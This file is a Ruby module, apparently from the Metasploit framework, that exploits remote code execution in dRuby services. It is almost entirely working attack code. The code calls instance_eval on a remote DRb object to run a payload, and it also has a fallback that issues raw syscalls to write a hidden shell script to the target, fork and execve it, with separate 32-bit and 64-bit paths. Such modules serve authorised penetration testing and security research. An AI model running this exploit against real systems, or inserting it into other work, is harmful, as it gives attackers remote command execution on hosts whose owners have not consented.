##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'drb/drb'

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Distributed Ruby Send instance_eval/syscall Code Execution',
      'Description'    => %q{
        This module exploits remote code execution vulnerabilities in dRuby.

        If the dRuby application sets $SAFE = 1, the instance_eval target will fail.
        In this event, the syscall target is preferred. This can be set with target 1.
      },
      'Author'         => [ 'joernchen <joernchen[at]phenoelit.de>' ], #(Phenoelit)
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.ruby-doc.org/stdlib-1.9.3/libdoc/drb/rdoc/DRb.html' ],
          [ 'URL', 'http://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 32768,
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [
        ['instance_eval', {}],
        ['syscall', {}]
      ],
      'DisclosureDate' => 'Mar 23 2011',
      'DefaultTarget' => 0))


      register_options(
        [
          OptString.new('URI', [true, "The dRuby URI of the target host (druby://host:port)", ""]),
        ], self.class)
  end

  def exploit
    serveruri = datastore['URI']
    DRb.start_service
    p = DRbObject.new_with_uri(serveruri)
    class << p
      undef :send
    end

    case target.name
    when 'instance_eval'
      print_status('Trying to exploit instance_eval')
      exploit_instance_eval(p)
    when 'syscall'
      print_status('Trying to exploit syscall')
      exploit_syscall(p)
    end
  end

  def exploit_instance_eval(p)
    begin
      p.send(:instance_eval,"Kernel.fork { `#{payload.encoded}` }")
    rescue SecurityError
      print_error('instance_eval failed due to security error')
    rescue DRb::DRbConnError
      print_error('instance_eval failed due to connection error')
    end
  end

  def exploit_syscall(p)
    filename = "." + Rex::Text.rand_text_alphanumeric(16)

    begin
      begin
        print_status('Attempting 32-bit exploitation')
        # syscall to decide wether it's 64 or 32 bit:
        # it's getpid on 32bit which will succeed, and writev on 64bit
        # which will fail due to missing args
        p.send(:syscall,20)
        # syscall open
        i =  p.send(:syscall,8,filename,0700)
        # syscall write
        p.send(:syscall,4,i,"#!/bin/sh\n" << payload.encoded,payload.encoded.length + 10)
        # syscall close
        p.send(:syscall,6,i)
        # syscall fork
        p.send(:syscall,2)
        # syscall execve
        p.send(:syscall,11,filename,0,0)

      # likely 64bit system
      rescue Errno::EBADF
        print_status('Target is a 64-bit system')
        # syscall creat
        i = p.send(:syscall,85,filename,0700)
        # syscall write
        p.send(:syscall,1,i,"#!/bin/sh\n" << payload.encoded,payload.encoded.length + 10)
        # syscall close
        p.send(:syscall,3,i)
        # syscall fork
        p.send(:syscall,57)
        # syscall execve
        p.send(:syscall,59,filename,0,0)
      end

    # not vulnerable
    rescue SecurityError
      print_error('syscall failed due to security error')
      return
    rescue DRb::DRbConnError
      print_error('syscall failed due to connection error')
      return
    end

    register_files_for_cleanup(filename)
  end

end
